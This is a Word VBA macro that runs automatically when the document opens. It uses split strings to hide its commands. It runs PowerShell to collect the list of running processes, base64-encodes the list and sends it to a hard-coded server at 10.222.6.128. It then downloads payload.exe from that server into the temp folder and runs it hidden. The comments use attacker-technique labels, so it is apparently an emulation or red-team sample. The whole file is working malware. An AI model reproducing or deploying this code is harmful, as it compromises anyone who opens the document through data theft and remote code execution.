Private Sub Document_Open()
    Dim shell As Object
    Set shell = CreateObject("WSc" & "rip" & "t.S" & "hell")
    
    ' Discovery: Get process information using PowerShell
    Dim psCommand As String
    psCommand = "pow" & "ersh" & "ell.e" & "xe -C" & "ommand ""G" & "et-W" & "miObj" & "ect -Q" & "uery 'SEL" & "ECT * F" & "ROM Win32_" & "Process' | ForEa" & "ch-Objec" & "t { $_.P" & "rocessName + ' ' + $_.P" & "rocessId + ' ' + $_.Ex" & "ecutablePath } | Out-S" & "tring | ForEa" & "ch-Objec" & "t { [C" & "onvert]::ToB" & "ase64Str" & "ing([T" & "ext.Enco" & "ding]::UTF8.Ge" & "tBytes($_)) }"""
    
    Dim processInfo As String
    processInfo = shell.Exec(psCommand).StdOut.ReadAll
    
    ' C2: Send the discovery data to the remote server
    Dim http As Object
    Set http = CreateObject("MSX" & "ML2.X" & "MLHTTP")
    http.Open "GE" & "T", "ht" & "tp://10" & ".222.6" & ".128/r" & "eceiv" & "er.ph" & "p?dat" & "a=" & processInfo, False
    http.Send
    
    ' Execution: Download and execute a payload
    Dim payloadURL As String
    payloadURL = "ht" & "tp://10" & ".222.6" & ".128/p" & "ayloa" & "d.exe"
    
    Dim payloadPath As String
    payloadPath = shell.ExpandEnvironmentStrings("%T" & "EMP%") & "\pa" & "yloa" & "d.e" & "xe"
    
    Dim xmlHTTP As Object
    Set xmlHTTP = CreateObject("MSX" & "ML2.X" & "MLHTTP")
    xmlHTTP.Open "GE" & "T", payloadURL, False
    xmlHTTP.Send
    
    Dim adoStream As Object
    Set adoStream = CreateObject("ADO" & "DB.S" & "tream")
    adoStream.Type = 1 ' adTypeBinary
    adoStream.Open
    adoStream.Write xmlHTTP.ResponseBody
    adoStream.SaveToFile payloadPath, 2 ' adSaveCreateOverWrite
    
    ' Execute the downloaded payload
    shell.Run payloadPath, 0, True
End Sub